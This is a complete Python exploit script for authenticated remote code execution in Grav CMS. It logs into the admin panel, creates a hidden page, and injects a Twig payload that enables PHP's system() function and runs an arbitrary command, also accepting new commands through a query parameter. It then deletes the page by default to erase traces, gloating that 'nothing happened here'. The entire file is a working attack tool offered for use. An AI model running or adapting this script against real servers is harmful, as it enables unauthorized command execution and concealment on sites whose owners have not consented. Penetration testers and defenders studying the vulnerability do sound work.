#!/usr/bin/python3

import requests
import re
import argparse
from urllib.parse import urlparse
import string
import random
from warnings import filterwarnings
import signal
from sys import exit as sys_exit


# Define color dictionary
color = {
    "RESET": '\033[0m',
    "RED": '\033[91m',
    "GREEN": '\033[92m',
    "YELLOW": '\033[93m',
    "BLUE": '\033[94m',
    "MAGENTA": '\033[95m',
    "CYAN": '\033[96m',
    "WHITE": '\033[97m'
}


# Define some pretty characters
STAR: str = f"{color['YELLOW']}[{color['BLUE']}*{color['YELLOW']}]{color['RESET']}"
WARNING_STR: str = f"{color['RED']}[{color['YELLOW']}!{color['RED']}]{color['RESET']}"


# Ctrl+C
def signal_handler(sig, frame)->None:
    print(f"\n{WARNING_STR} {color['RED']}Ctrl+C! Exiting...{color['RESET']}")
    sys_exit(0)


# Capture Ctrl+C
signal.signal(signal.SIGINT, signal_handler)


def parse_arguments():
    """
    Parse arguments from user
    """
    parser = argparse.ArgumentParser(description="Grav CMS RCE (Authenticated).")

    parser.add_argument('-t', '--target', type=str, required=True,
                         help='URL where Grav CMS is running. Example: http://10.10.10.10')
    parser.add_argument('-P', '--port', type=int, default=80, 
                         help='Port running Grav CMS. Default: 80')
    parser.add_argument('-u', '--username', type=str, required=True,
                         help='Username to authenticate in Grav CMS')
    parser.add_argument('-p', '--password', type=str, required=True,
                         help='Password for the user in Grav CMS.')
    parser.add_argument('-x', '--command', type=str, required=True,
                        help='Command to inject/run.')
    parser.add_argument('--no-delete-file', action='store_true', 
                         help ='Do NOT delete the generated files. Useful to check command execution output.')
    parser.add_argument('--panel-route', type=str, default='/admin',
                         help='Admin Panel route in Grav CMS. Default: /admin')
    parser.add_argument('--show-warnings', action='store_false', help='Show warnings (if there are).')

    return parser.parse_args()


def check_if_https_in_url(url: str, port: int)->str:
    """
    Check the 'target' argument the user has provided
    """
    if url.endswith("/"):
        url = url[:-1]
    if not url.startswith('https://') and not url.startswith('http://'):
        return f"http://{url}:{port}"
    return f"{url}:{port}"


def get_items_from_admin_panel(admin_panel_url: str, panel_route: str):
    """
    Get items from a generic session such as cookie and login_noce parameter
    """
    try:
        # Make a request to the page to get parameters
        r = requests.get(admin_panel_url, verify=False, timeout=10) # verify=False to avoid 'SSL' cert problems 
        if r.status_code != 200:
            print(f"{WARNING_STR} {color['RED']}Ups! Something happened! Got status code {r.status_code!r} =({color['RESET']}")
            print(f"   {color['RED']} You might misspelled the url or admin panel might not be located at {panel_route!r}{color['RESET']}")
            sys_exit(1)
    except Exception as e:
        print(f"{WARNING_STR}{color['RED']} An error ocurred:\n{color['YELLOW']}{e}{color['RESET']}")
        sys_exit(1)
    # Extract the session cookie and login-nonce
    session_cookie = r.headers.get('Set-Cookie')
    login_nonce_match = re.search(r'<input type="hidden" name="login-nonce" value="([^"]+)"', r.text)
    # Get the items
    if session_cookie and login_nonce_match:
        session_cookie = session_cookie.split(';', 1)[0]  
        login_nonce = login_nonce_match.group(1)
    else:
        print(f"{WARNING_STR} Unable to get cookie session and or 'login-nonce' values. Their respective values are {session_cookie!r} and {login_nonce_match!r}")
        sys_exit(1)

    return session_cookie, login_nonce


def login_request(url: str, obtained_generic_cookie: str, obtained_login_nonce: str, user: str, password: str)->str:
    """
    Get parameters for the session
    """
    # Prepare the POST data
    login_data = {
        "data[username]": user,
        "data[password]": password,
        "task": "login",
        "login-nonce": obtained_login_nonce
    }
    # Create a generic cookie
    headers = {
        "Host": urlparse(url).hostname,
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "close",
        "Cookie": obtained_generic_cookie
    }
    
    try:
        # Make a request with a generic session
        r = requests.post(url, headers=headers, data=login_data, verify=False) 
        if 'Login failed' in r.text:
           print(f"{WARNING_STR} {color['RED']}Invalid username or password. Please check and try again{color['RESET']}")
           sys_exit(1)
        if r.status_code != 200 and r.status_code != 303:
           print(f"{WARNING_STR} {color['RED']} Ups! Something happened! Got status code {r.status_code!r} =({color['RESET']}")
           sys_exit(1)
    except Exception as e:
       print(f"{WARNING_STR}{color['RED']} An error ocurred:\n{color['YELLOW']}{e}{color['RESET']}")
       sys_exit(1)
    
    return r.headers.get('Set-Cookie')


def get_admin_nonce(url: str, new_cookie: str)->str|None:
    """
    Get 'admin_nonce' parameter. Needed to create new pages.
    """
    # Make a request
    r = requests.get(url, headers={"Cookie": new_cookie}, verify=False)
    # Searcho for 'admin_nonce' in HTML response
    admin_nonce_match = re.search(r'admin_nonce: \'([^\']+)\'', r.text)
    if admin_nonce_match:
        return admin_nonce_match.group(1)
    # If it was not found, exit the program
    print(f"{WARNING_STR} Unable to find 'admin_nonce' parameter. Maybe your user does not have the rights for it?")
    sys_exit(1)


def create_malicious_page(url: str, new_session_cookie: str, admin_nonce: str):
    """
    Create the malicious page that will contain the payload
    """
    # Set a random page name to save the payload
    malicious_page = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    # Set data to post to the malicious page
    new_page_data = {
        "data[title]": malicious_page,
        "data[folder]": malicious_page,
        "data[route]": "",
        "data[name]": "default",
        "data[visible]": "1",
        "data[blueprint]": "",
        "task": "continue",
        "admin-nonce": admin_nonce
    }
    try:
        # Make a request to create the malicious page
        r = requests.post(url, data=new_page_data, headers={"Cookie": new_session_cookie}, verify=False)
        if r.status_code != 200 and r.status_code != 303:
            print(f"{WARNING_STR} {color['RED']} Unable to create the new page. Response HTTP Status {r.status_code!r}{color['RESET']}")
            sys_exit(1)
        # Search for the new created page
        malicious_page_url = url+"/pages/"+malicious_page+"/:add"
        malicious_page_response = requests.get(malicious_page_url, headers={"Cookie": new_session_cookie})
        if malicious_page_response.status_code != 200:
            print(f"{WARNING_STR} {color['RED']} We were able to create the new page but unable to acess to it...{color['RESET']}")
            sys_exit(1)
        # Extract 'form_nonce' and '__unique_form_id__' parameters needed to add content to the generated page
        form_nonce_match = re.search(r'<input type="hidden" name="form-nonce" value="([^"]+)"', malicious_page_response.text)
        unique_form_id_match = re.search(r'<input type="hidden" name="__unique_form_id__" value="([^"]+)"', malicious_page_response.text)
        if form_nonce_match and unique_form_id_match:
            form_nonce = form_nonce_match.group(1)
            unique_form_id = unique_form_id_match.group(1)
        else:
            print(f"{WARNING_STR} {color['RED']} Unable to find parameters 'form_nonce' and/or '__unique_form_id__' needed to add the payload.")
            sys_exit(1)
        
    except Exception as e:
        print(f"{WARNING_STR} {color['RED']} An error ocurred while trying to create the new page:\n{e}{color['RESET']}")

    return malicious_page, malicious_page_url, form_nonce, unique_form_id


def upload_payload(url: str, malicious_page_name: str, new_cookie: str, form_nonce: str, unique_form_id: str, command: str):
    """
    Post the payload
    """
    print(f"{STAR}{color['GREEN']} Uploading payload...{color['RESET']}")
    # Payload to inject
    payload = {
        "task": "save",
        "data[header][title]": malicious_page_name,
        "data[content]": f"{{% set arr = {{'1': 'system', '2':'foo'}} %}}\n{{% set dump = print_r(grav.twig.twig_vars['config'].set('system.twig.safe_functions', arr)) %}}\n{{% set cmd = uri.query('do') is empty ? '{command}' : uri.query('do') %}}\n<pre>Cmd-Output:</pre>\n<h5>{{{{ system(cmd) }}}}</h5>",
        "data[folder]": malicious_page_name,
        "data[route]": "",
        "data[name]": "default",
        "data[header][body_classes]": "",
        "data[ordering]": "1",
        "data[order]": "",
        "toggleable_data[header][process]": "on",
        "data[header][process][markdown]": "1",
        "data[header][process][twig]": "1",
        "data[header][order_by]": "",
        "data[header][order_manual]": "",
        "data[blueprint]": "",
        "data[lang]": "",
        "_post_entries_save": "edit",
        "__form-name__": "flex-pages",
        "__unique_form_id__": unique_form_id,
        "form-nonce": form_nonce,
        "toggleable_data[header][published]": "0",
        "toggleable_data[header][date]": "0",
        "toggleable_data[header][publish_date]": "0",
        "toggleable_data[header][unpublish_date]": "0",
        "toggleable_data[header][metadata]": "0",
        "toggleable_data[header][dateformat]": "0",
        "toggleable_data[header][menu]": "0",
        "toggleable_data[header][slug]": "0",
        "toggleable_data[header][redirect]": "0",
        "toggleable_data[header][twig_first]": "0",
        "toggleable_data[header][never_cache_twig]": "0",
        "toggleable_data[header][child_type]": "0",
        "toggleable_data[header][routable]": "0",
        "toggleable_data[header][cache_enable]": "0",
        "toggleable_data[header][visible]": "0",
        "toggleable_data[header][debugger]": "0",
        "toggleable_data[header][template]": "0",
        "toggleable_data[header][append_url_extension]": "0",
        "toggleable_data[header][redirect_default_route]": "0",
        "toggleable_data[header][routes][default]": "0",
        "toggleable_data[header][routes][canonical]": "0",
        "toggleable_data[header][routes][aliases]": "0",
        "toggleable_data[header][admin][children_display_order]": "0",
        "toggleable_data[header][login][visibility_requires_access]": "0",
        "toggleable_data[header][permissions][inherit]": "0",
        "toggleable_data[header][permissions][authors]": "0",
    }

    # Send the payload
    r = requests.post(url, data=payload, headers={"Cookie": new_cookie}, verify=False)

    if r.status_code != 200 and r.status_code != 303:
        print(f"{WARNING_STR}{color['RED']} Unable to post the payload. {color['RESET']}")
        sys_exit(1)
    return 


def check_payload(url: str, malicious_page_name: str, admin_cookie: str)->None:
    """
    Check if the payload has been uploaded
    """
    payload_page = f"{url}/pages/{malicious_page_name.lower()}" # Linux is case sensitive
    r = requests.get(payload_page, headers={"Cookie": admin_cookie}, verify=False)
    if r.status_code != 200:
        print(f"{WARNING_STR}{color['RED']} Could not create the malicious page.{color['RESET']}")
        sys_exit(1)
    return


def trigger_command(payload_url: str):
    """
    Trigger the generated payload
    """
    print(f"{STAR}{color['GREEN']} Executing payload...{color['RESET']}")
    r = requests.get(payload_url, verify=False)
    if r.status_code != 200:
        print(f"{WARNING_STR} {color['RED']} Unable to access to the generated payload URL. Status code: {r.status_code}")
        sys_exit(1)
    return


def delete_created_page(url: str, malicious_page_name: str, admin_nonce: str, admin_cookie: str)->None:
    """
    Delete the generated payload
    """
    delete_url = f"{url}/pages/{malicious_page_name.lower()}/task:delete/admin-nonce:{admin_nonce}"
    r = requests.get(delete_url, headers={"Cookie": admin_cookie}, verify=False)
    if r.status_code == 200:
        print(f"{STAR}{color['GREEN']} Payload deleted. Actually, what payload? Nothing happened here ;) {color['BLUE']}\n\n    ~Happy hacking{color['RESET']}")
    return


def main()->None:
    # Get user arguments
    args = parse_arguments()
    # By default, ignore all warnings (related to unsecure SSL connections)
    if args.show_warnings:
        filterwarnings("ignore")
    # Check the url provided is correct
    url = check_if_https_in_url(args.target, args.port)
    print(f"{STAR} {color['GREEN']}Attacking {color['BLUE']}{url!r}{color['GREEN']}...{color['RESET']}")
    # Set the admin url, where "Admin" panel is located
    admin_panel_url = url + args.panel_route
    # Get parameters from an anonymous session before sending credentials
    session_cookie, login_nonce = get_items_from_admin_panel(admin_panel_url, args.panel_route)
    # Attempt a login request
    admin_cookie = login_request(admin_panel_url, session_cookie, login_nonce, args.username, args.password)
    # Get 'admin_nonce' to be able to create pages
    admin_nonce = get_admin_nonce(admin_panel_url, admin_cookie)
    # Create the malicious page and extract parameters needed to edit it later
    malicious_page_name, malicious_page_url, form_nonce, unique_id =  create_malicious_page(admin_panel_url, admin_cookie, admin_nonce)
    # Upload the payload into the created page
    upload_payload(malicious_page_url, malicious_page_name, admin_cookie, form_nonce, unique_id, args.command)
    # Check the payload has been succesfully uploaded
    check_payload(admin_panel_url, malicious_page_name, admin_cookie)
    malicious_final_page = f"{url}/{malicious_page_name.lower()}"
    # Trigger the command
    trigger_command(malicious_final_page)
    if not args.no_delete_file:
        # Delete the generated payload and here nothing has happened...
        delete_created_page(admin_panel_url, malicious_page_name, admin_nonce, admin_cookie)
        return
    # Print where the payload has been uploaded
    print(f"{STAR} {color['GREEN']}Payload uploaded. Visit {color['BLUE']}{malicious_final_page!r}{color['GREEN']} to see the command execution output{color['RESET']}")


if __name__ == "__main__":
    main()
